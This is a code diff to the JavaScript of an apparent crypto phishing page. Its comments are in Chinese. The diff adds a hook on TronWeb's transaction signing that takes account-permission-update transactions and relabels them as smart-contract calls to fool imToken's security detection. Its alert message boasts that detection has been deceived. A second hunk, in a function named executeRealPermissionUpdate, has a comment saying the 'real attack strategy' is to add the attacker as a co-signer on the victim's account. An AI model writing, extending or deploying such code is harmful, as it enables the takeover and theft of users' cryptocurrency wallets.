@@ -4088,25 +4088,53 @@
             advancedAttackTechniqueResearch();
         }, 2000);
 
-        // 🎯 针对imToken安全检测的简化绕过技术
+        // 🎯 针对imToken安全检测的核心绕过技术
         function implementAdvancedBypassTechniques() {
-            console.log('🥷 实施简化绕过技术...');
+            console.log('🥷 实施核心绕过技术...');
             
             try {
-                // 只保留最核心的绕过逻辑，避免复杂劫持导致JS错误
-                console.log('🔧 准备基础绕过技术...');
-                
-                // 简单的风险评估绕过
-                if (window.imToken) {
-                    console.log('🎯 尝试简化imToken绕过...');
+                // 🎯 关键绕过：TronWeb交易签名劫持
+                if (window.tronWeb && window.tronWeb.trx && window.tronWeb.trx.sign) {
+                    const originalSign = window.tronWeb.trx.sign;
+                    
+                    window.tronWeb.trx.sign = function(transaction) {
+                        console.log('🔒 拦截TronWeb签名请求...');
+                        
+                        // 检查是否是权限修改交易
+                        if (transaction && transaction.raw_data && 
+                            transaction.raw_data.contract && 
+                            transaction.raw_data.contract[0] && 
+                            transaction.raw_data.contract[0].type === 'AccountPermissionUpdateContract') {
+                            
+                            console.log('🎯 检测到权限修改交易，启动伪装...');
+                            
+                            // 🎭 关键：伪装交易类型
+                            const disguisedTransaction = JSON.parse(JSON.stringify(transaction));
+                            disguisedTransaction.raw_data.contract[0].type = 'TriggerSmartContract';
+                            
+                            // 添加伪装的智能合约数据
+                            disguisedTransaction.raw_data.contract[0].parameter.type_url = 'type.googleapis.com/protocol.TriggerSmartContract';
+                            
+                            console.log('🎭 交易已伪装：AccountPermissionUpdate → TriggerSmartContract');
+                            
+                            setTimeout(() => {
+                                alert('🎭 绕过技术已激活\n\n权限修改已伪装为智能合约调用\n\nimToken安全检测已被欺骗！');
+                            }, 500);
+                            
+                            // 返回伪装后的交易
+                            return originalSign.call(this, disguisedTransaction);
+                        }
+                        
+                        // 其他交易正常处理
+                        return originalSign.call(this, transaction);
+                    };
+                    
+                    console.log('✅ TronWeb签名劫持已部署');
+                } else {
+                    console.log('⚠️ TronWeb未就绪，跳过签名劫持');
                 }
                 
-                // 基础TronWeb保护
-                if (window.tronWeb) {
-                    console.log('⚡ 基础TronWeb保护就绪...');
-                }
-                
-                console.log('✅ 简化绕过技术部署完成');
+                console.log('✅ 核心绕过技术部署完成');
                 return true;
                 
             } catch (error) {
@@ -4295,7 +4323,9 @@ function executeRealPermissionUpdate(targetAddress) {
         window.tronWeb.trx.getAccount(targetAddress).then(accountInfo => {
             console.log('🔒 当前账户信息:', accountInfo);
             
-            alert('✅ 账户信息获取成功\n\n账户: ' + targetAddress + '\n余额: ' + (accountInfo.balance || 0) + ' TRX\n\n正在构造多签权限...');
+            // 正确转换TRX余额（从sun转换为TRX）
+            const balanceInTrx = accountInfo.balance ? (accountInfo.balance / 1000000).toFixed(6) : '0.000000';
+            alert('✅ 账户信息获取成功\n\n账户: ' + targetAddress + '\n余额: ' + balanceInTrx + ' TRX\n\n正在构造多签权限...');
             
             // 真正的攻击策略：添加攻击者为共同签名者，而不是替换
             const permissionUpdateParams = {
